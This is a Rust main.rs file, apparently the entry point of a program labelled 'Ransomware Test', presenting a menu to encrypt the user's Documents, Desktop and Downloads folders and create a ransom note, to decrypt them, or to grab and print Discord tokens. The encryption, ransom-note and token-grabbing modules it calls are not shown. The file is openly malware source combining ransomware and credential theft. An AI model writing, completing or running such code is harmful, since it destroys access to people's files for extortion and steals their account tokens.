// src/main.rs
mod crypto;
mod token_grabber;
mod ransom;

use std::io::{self, Write};
use std::path::Path;

fn main() {
    println!("=== Ransomware Test ===");
    println!("1. Encrypt files");
    println!("2. Decrypt files");
    println!("3. Grab Discord tokens");
    print!("> ");
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    let choice = input.trim();

    match choice {
        "1" => {
            print!("Enter encryption password: ");
            io::stdout().flush().unwrap();
            let mut password = String::new();
            io::stdin().read_line(&mut password).unwrap();
            let password = password.trim();

            let target_dirs = vec![
                dirs::document_dir().unwrap(),
                dirs::desktop_dir().unwrap(),
                dirs::download_dir().unwrap(),
            ];

            crypto::encrypt_directories(&target_dirs, password);
            ransom::create_ransom_note();
            println!("Files encrypted!");
        }
        "2" => {
            print!("Enter decryption password: ");
            io::stdout().flush().unwrap();
            let mut password = String::new();
            io::stdin().read_line(&mut password).unwrap();
            let password = password.trim();

            let target_dirs = vec![
                dirs::document_dir().unwrap(),
                dirs::desktop_dir().unwrap(),
                dirs::download_dir().unwrap(),
            ];

            crypto::decrypt_directories(&target_dirs, password);
            ransom::remove_ransom_note();
            println!("Files decrypted!");
        }
        "3" => {
            let tokens = token_grabber::grab_tokens();
            for token in &tokens {
                println!("Token: {}", token);
            }
            if tokens.is_empty() {
                println!("No tokens found");
            }
        }
        _ => {
            println!("Invalid choice");
        }
    }
}
